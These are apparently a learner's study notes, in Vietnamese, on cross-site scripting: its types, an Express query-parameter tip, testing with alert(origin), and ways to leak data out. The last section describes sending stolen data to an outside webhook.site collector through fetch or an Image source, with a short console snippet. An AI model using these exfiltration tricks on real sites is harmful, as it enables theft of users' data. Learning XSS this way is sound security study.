# XSS
#### Sức công phá của XSS tùy thuộc vào ngữ cảnh nó xảy ra
# Wormable-XSS
#### Tấn công cuốn chiếu từ nạn nhân này sang nạn nhân khác ==> xuất hiện giữa những mạng xã hội có tương tác cao(vd: nhắn tin,....)
#### XSS xảy ra khi ứng dụng web đưa dữ liệu không an toàn (do người dùng nhập) vào một trang web mà không được kiểm tra hoặc mã hóa đúng cách. Trình duyệt sẽ thực thi mã này vì nó tin rằng đó là mã hợp lệ từ máy chủ.
# Các loại XSS
#### Stored XSS, Reflected XSS, DOM-based XSS
# Stored XSS
#### Kẻ tấn công chèn mã độc vào phần bình luận, ai mở trang bình luận đấy lên đều bị dính xss
# Reflected XSS
#### Mã độc không được lưu trên máy chủ mà được phản xạ lại với người dùng 
# DOM-based XSS 
#### Lỗ hổng này xuất hiện ở phía client> mã độc thực thi khi JS của trang web xử lý dữ liệu không an toàn và ghi nóp vào DOM
# Note JS thường dùng thư viện EXPRESSJS 
#### req.query chính là ?x=aaa
# Nên dùng alert(origin) để chạy xss
#### Dùng webhook để gọi ra ngoài api
# Cách để leak data ra bên ngoài
#### Cách 1: dùng chính fetch
#### Cách 2: tạo ra 1 tấm ảnh để cái nguồn (source) nó là url webhook  làm trong console " anh = new Image() anh.src = `webhook.site` "
#### Nên sử dụng acii table để tránh bị url hiểu lầm
